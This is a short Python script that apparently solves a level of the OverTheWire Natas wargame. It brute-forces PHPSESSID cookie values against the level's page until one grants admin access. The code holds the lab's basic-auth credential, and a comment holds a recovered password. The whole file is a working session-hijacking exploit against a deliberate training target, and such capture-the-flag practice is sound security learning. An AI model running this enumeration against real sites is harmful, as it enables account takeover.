import requests
from requests.auth import HTTPBasicAuth
from sys import exit

def query(id):
    print("querying {}".format(id))
    url = "http://natas18.natas.labs.overthewire.org/index.php"
    auth = HTTPBasicAuth('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')
    cookies={"PHPSESSID": str(id)}

    res = requests.get(url, auth=auth, cookies=cookies)
    if 'You are an admin' in res.text:
        print(res.text)
        exit(0)

# id = 119 works
# pass = 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
for id in range(0, 640):
    print(id)
    query(id)
